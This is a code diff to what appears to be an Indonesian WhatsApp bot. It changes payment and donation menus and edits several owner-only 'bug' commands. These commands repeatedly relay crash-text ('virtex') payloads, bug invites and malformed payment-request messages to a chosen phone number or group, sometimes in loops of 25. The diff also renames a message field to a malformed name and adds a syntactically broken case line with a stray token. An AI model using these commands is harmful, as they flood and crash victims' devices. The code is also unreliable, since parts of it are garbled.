@@ -392,7 +392,7 @@ const repPy = {
 		participant: '0@s.whatsapp.net'
 	},
 	message: {
-		requestPaymentMessage: {
+		requestmentMessage: {
 			currencyCodeIso4217: "USD",
 			amount1000: 999999999,
 			requestFrom: '0@s.whatsapp.net',
@@ -945,8 +945,7 @@ rows: [
 {title: `𝗧𝗢𝗣𝗨𝗣 𝗖𝗔𝗟 𝗢𝗙 𝗗𝗨𝗧𝗬`, rowId: `${prefix}calof`},
 {title: `𝗧𝗢𝗣𝗨𝗣 𝗘-𝗪𝗔𝗟𝗟𝗘𝘛`, rowId: `${prefix}saldo`},
 {title: `𝗞𝗘𝗕𝗨𝗧𝗨𝗛𝗔𝗡 𝗦𝗢𝗦𝗜𝗔𝗟 𝗠𝗘𝗗𝗜𝗔`, rowId: `${prefix}suntik`},
-{title: `𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨`, rowId: `${prefix}ownermenu`},
-{title: `𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨`, rowId: `${prefix}downloadmenu`},
+{title: `𝗩𝗢𝗨𝗖𝗛𝗘𝗥 𝗧𝗥𝗜`, rowId: `${prefix}pulsa`},
 ]}]
 const listMenuMessage = { 
 text: `Silahkan @${sender.split("@")[0]} Pilih List Menu DI Bawah`,
@@ -1841,16 +1840,25 @@ if (!text) return reply('Masukan Link Nya!!!')
 downloadMp3(text)
 }
 break
+case 'payment': case 'bayar' 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI':{
+baymax.sendMessage(from,{image:qrisbayar, caption:`Hai Kak @${sender.split("@")[0]} Mau ${command}?
+
+💸𝗣𝗔𝗬𝗠𝗘𝗡𝗧
+𝚂𝙲𝙴𝙽𝙳 𝚀𝚁 𝙳𝙸 𝙰𝚃𝙰𝚂 𝙿𝙰𝙳𝙰 𝙰𝙿𝙻𝙸𝙺𝙰𝚂𝙸 𝙴-𝚆𝙰𝙻𝙻𝙴𝚃 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙻𝙰𝙺𝚄𝙺𝙰𝙽 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽 
+𝙉𝙊𝙏𝙀 : 
+𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰 𝙺𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝚃𝚁𝙰𝙽𝙵𝙴𝚁 𝙺𝙴 𝙰𝙳𝙼𝙸𝙽 𝙰𝙶𝙰𝚁 𝚂𝙴𝙶𝙴𝚁𝙰 𝙳𝙸 𝙿𝚁𝙾𝚂𝙴𝚂 𝙾𝙻𝙴𝙷 𝙰𝙳𝙼𝙸𝙽 
+
+𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛.`, mentions: [sender]},{quoted:m})
+}
+break
 case 'donasi': case 'donate':{
 baymax.sendMessage(from,{image:qrisdonate, caption:`Hai Kak @${sender.split("@")[0]} Mau ${command}?
 
-Silahkan Scan Qris Di Atas Ya Kak
-Atau Juga Bisa Isi Nomor Payment Di Bawah Ya
-Gopay : ${gopayno}
-Dana : ${danano}
-Shopeepay : ${shopeepayno}
+𝘔𝘢𝘶 𝘉𝘦𝘳𝘥𝘰𝘯𝘢𝘴𝘪 𝘠𝘢 𝘒𝘢𝘬 𝘚𝘪𝘭𝘢𝘩𝘭𝘢𝘯 𝘚𝘤𝘢𝘯 𝘘𝘳 𝘋𝘐 𝘈𝘵𝘢𝘴 𝘉𝘦𝘳𝘢𝘱𝘢𝘱𝘶𝘯 𝘋𝘰𝘯𝘢𝘴𝘪 𝘕𝘠𝘈 𝘊𝘶𝘬𝘶𝘱 𝘉𝘦𝘳𝘩𝘢𝘳𝘨𝘢 𝘉𝘢𝘨𝘪 𝘎𝘜𝘈
+𝙉𝙊𝙏𝙀 : 
+𝑇𝑒𝑟𝑖𝑚𝑎𝑘𝑎𝑠𝑖ℎ 𝑌𝑎𝑛𝑔 𝑆𝑢𝑑𝑎ℎ 𝐵𝑒𝑟𝑑𝑜𝑛𝑎𝑠𝑖
 
-Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`, mentions: [sender]},{quoted:m})
+𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛.`, mentions: [sender]},{quoted:m})
 }
 break
 case 'topupff': case 'topupml': case 'topupsaldo':{
@@ -2538,7 +2546,7 @@ case 'jagoan' : {
 if (!itsMebaymax) return reply(mess.owner)
 if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
 baymax.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
-requestPaymentMessage: { 
+requestmentMessage: { 
 Message: { 
 extendedTextMessage: { 
 text: 'Hai Aku baymax', 
@@ -2564,7 +2572,7 @@ break
 case 'jagoanneon' : {
 if (!itsMebaymax) return reply(mess.owner)
 baymax.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
-requestPaymentMessage: { 
+requestmentMessage: { 
 Message: { 
 extendedTextMessage: { 
 text: `baymax Bot ${virus}${virtex(prefix)}`, 
@@ -2619,7 +2627,7 @@ num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.relayMessage(num, {
-requestPaymentMessage: { 
+requestmentMessage: { 
 Message: { 
 extendedTextMessage: { 
 text: `baymax Bot ${virus}${virtex(prefix)}`, 
@@ -2842,7 +2850,7 @@ if (!itsMebaymax) return reply(mess.owner)
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 baymax.relayMessage(m.chat, {
-requestPaymentMessage: { 
+requestmentMessage: { 
 Message: { 
 extendedTextMessage: { 
 text: `baymax Bot ${virus}${virtex(prefix)}`, 
@@ -2929,7 +2937,7 @@ var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({sticke
 var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-baymax ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
 for (let i = 0; i < jumlah; i++) {
 baymax.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
-baymax.relayMessage(numt, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
+baymax.relayMessage(numt, { requestmentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
 baymax.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
 baymax.relayMessage(numt, order.message, { messageId: order.key.id })
 baymax.relayMessage(numt, audio.message, { messageId: audio.key.id })
@@ -2951,7 +2959,7 @@ jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
 let kir = await baymax.groupAcceptInvite(result)
 baymax.relayMessage(kir, {
-requestPaymentMessage: { 
+requestmentMessage: { 
 Message: { 
 extendedTextMessage: { 
 text: `baymax Bot ${virus}${virtex(prefix)}`, 
